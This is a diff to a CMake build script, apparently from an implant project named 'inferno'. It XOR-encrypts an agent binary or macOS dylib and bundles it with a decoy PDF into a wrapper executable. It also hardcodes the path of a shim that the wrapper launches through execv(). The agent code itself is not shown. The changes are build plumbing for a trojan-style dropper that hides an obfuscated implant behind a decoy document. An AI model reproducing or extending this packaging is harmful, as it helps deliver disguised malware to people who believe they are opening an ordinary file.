@@ -13,18 +13,26 @@ set(AGENT_BINARY_HEADER "${CMAKE_CURRENT_BINARY_DIR}/agent_binary.h")
 
 set(INFERNO_XOR_KEY "2B7E151628AED2A6")
 
+if(APPLE)
+    set(EMBEDDED_AGENT "$<TARGET_FILE:inferno_agent_dylib>")
+    set(EMBEDDED_AGENT_DEP inferno_agent_dylib)
+else()
+    set(EMBEDDED_AGENT "${CMAKE_BINARY_DIR}/inferno_client${CMAKE_EXECUTABLE_SUFFIX}")
+    set(EMBEDDED_AGENT_DEP inferno_client)
+endif()
+
 add_custom_command(
     OUTPUT  ${AGENT_BINARY_HEADER}
     COMMAND ${Python3_EXECUTABLE}
             "${CMAKE_CURRENT_SOURCE_DIR}/bin2header.py"
             "--key" "${INFERNO_XOR_KEY}"
-            "${CMAKE_BINARY_DIR}/inferno_client${CMAKE_EXECUTABLE_SUFFIX}"
+            "${EMBEDDED_AGENT}"
             "${DECOY_PDF}"
             "${AGENT_BINARY_HEADER}"
-    DEPENDS  inferno_client
+    DEPENDS  ${EMBEDDED_AGENT_DEP}
              "${DECOY_PDF}"
              "${CMAKE_CURRENT_SOURCE_DIR}/bin2header.py"
-    COMMENT "Generating agent_binary.h (XOR-encrypted) from inferno_client + decoy PDF"
+    COMMENT "Generating agent_binary.h (XOR-encrypted) from agent binary + decoy PDF"
     VERBATIM
 )
 
@@ -55,6 +63,15 @@ target_include_directories(inferno_wrapper PRIVATE
     ${CMAKE_CURRENT_BINARY_DIR}
     ${CMAKE_CURRENT_SOURCE_DIR}/include
 )
+
+# Embed the full path to inferno_shim so the wrapper can find it
+# via execv() regardless of PATH (which may be corrupted by colons
+# in paths like C:C++ on macOS).
+if(APPLE)
+    target_compile_definitions(inferno_wrapper PRIVATE
+        INFERNO_SHIM_PATH="${CMAKE_BINARY_DIR}/inferno_shim${CMAKE_EXECUTABLE_SUFFIX}"
+    )
+endif()
 
 # UNLIT() macro returns a const char* from a lambda — the compiler can't
 # see through it to verify the format string is a literal. The string IS
